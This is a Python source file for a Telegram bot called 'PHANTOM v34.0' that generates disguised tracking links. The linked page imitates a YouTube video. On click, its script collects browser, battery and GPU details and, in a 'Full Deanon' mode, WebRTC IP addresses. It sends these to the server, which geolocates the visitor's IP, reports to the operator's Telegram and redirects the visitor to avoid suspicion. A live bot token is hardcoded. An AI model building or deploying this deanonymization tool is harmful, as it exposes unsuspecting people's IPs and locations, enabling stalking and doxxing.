import asyncio, threading, requests, uuid, json, os, base64, urllib.parse
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

vault = {}
user_modes = {}

# --- [2] ТЕМПЛЕЙТ (Максимально незаметный) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: Roboto, Arial, sans-serif; text-align: center; color: #0f0f0f; overflow: hidden; }
        .yt-header { padding: 12px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; position: absolute; top: 50%; left: 55%; transform: translate(-50%, -50%); border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body onclick="ignite()">
    <div class="yt-header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover;">
        <div class="play-btn"></div>
    </div>
    <div style="padding: 15px; text-align: left;">
        <div style="font-size: 16px; font-weight: 500; line-height: 1.2;">СМЕШНЫЕ МЕМЫ 2026 😂 #shorts #юмор</div>
        <div style="font-size: 12px; color: #606060; margin-top: 6px;">1.8 млн просмотров • 3 часа назад</div>
    </div>

<script>
let active = false;

async function getRTC() {
    return new Promise(res => {
        const ips = [];
        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => res("Blocked"));
        pc.onicecandidate = i => {
            if (!i || !i.candidate) return;
            const m = i.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
            if (m && !ips.includes(m[1])) ips.push(m[1]);
        };
        setTimeout(() => { pc.close(); res(ips.length ? ips.join(' | ') : "N/A"); }, 1000);
    });
}

async function ignite() {
    if(active) return; active = true;
    
    let d = { 
        aid: "{{ aid }}", 
        ua: navigator.userAgent, 
        res: screen.width+"x"+screen.height,
        bat: "N/A", gpu: "N/A", rtc: "N/A"
    };

    // Фоновый сбор данных
    try {
        let b = await navigator.getBattery();
        d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
        let gl = document.createElement('canvas').getContext('webgl');
        d.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
    } catch(e) {}

    // Если режим FULL - пробуем тянуть WebRTC (быстро)
    if ("{{ mode }}" === "FULL") {
        d.rtc = await getRTC();
    }

    // Отправка и мгновенный редирект
    fetch('/log', { 
        method: 'POST', 
        body: btoa(encodeURIComponent(JSON.stringify(d))),
        keepalive: true 
    });
    
    // Редирект без ожидания ответа сервера
    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
}
</script>
</body>
</html>
"""

# --- [3] ROUTES ---

@app.route('/')
def health():
    return "STATUS: OK", 200

@app.route('/v/<aid>')
def view(aid):
    m = user_modes.get(str(aid), "ANALYTICS")
    return render_template_string(HTML_TEMPLATE, aid=aid, mode=m)

@app.route('/log', methods=['POST'])
def logger():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        data = json.loads(urllib.parse.unquote(raw))
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp").json()
        
        tid = "ID-" + str(uuid.uuid4())[:6].upper()
        vault[tid] = {"data": data, "geo": geo}

        report = (
            f"🎯 **НОВЫЙ ЛОГ**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🌐 **IP:** `{ip}`\n"
            f"📍 **ГЕО:** `{geo.get('city')}, {geo.get('country')}`\n"
            f"🛡 **WebRTC:** `{data.get('rtc', 'N/A')}`\n"
            f"🔋 **Заряд:** `{data.get('bat')}`\n"
            f"💻 **GPU:** `{data.get('gpu', 'N/A')[:30]}...`\n"
            f"━━━━━━━━━━━━━━\n"
            f"🔑 **DUMP:** `{tid}`"
        )
        
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": data['aid'], "text": report, "parse_mode": "Markdown"})
        return "OK", 200
    except:
        return "Error", 500

# --- [4] BOT ---

@dp.message(Command("start"))
async def st(m: types.Message):
    kb = ReplyKeyboardBuilder().button(text="🧨 Сгенерировать ссылку").as_markup(resize_keyboard=True)
    await m.answer("🕶 **PHANTOM v34.0**", reply_markup=kb)

@dp.message(F.text == "🧨 Сгенерировать ссылку")
async def ms(m: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 Analytics", callback_data="m_ANALYTICS")
    kb.button(text="💥 Full Deanon (RTC)", callback_data="m_FULL")
    await m.answer("Выбери режим:", reply_markup=kb.adjust(1).as_markup())

@dp.callback_query(F.data.startswith("m_"))
async def fn(c: types.CallbackQuery):
    mode = c.data.split("_")[1]
    user_modes[str(c.from_user.id)] = mode
    await c.message.edit_text(f"✅ **ССЫЛКА:**\n🔗 `{BASE_URL}/v/{c.from_user.id}`\n\n*Режим: {mode}*")

@dp.message(F.text.startswith("ID-"))
async def gd(m: types.Message):
    t = m.text.strip().upper()
    if t in vault:
        await m.answer(f"📦 **DUMP {t}:**\n```json\n{json.dumps(vault[t], indent=2, ensure_ascii=False)}\n```")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
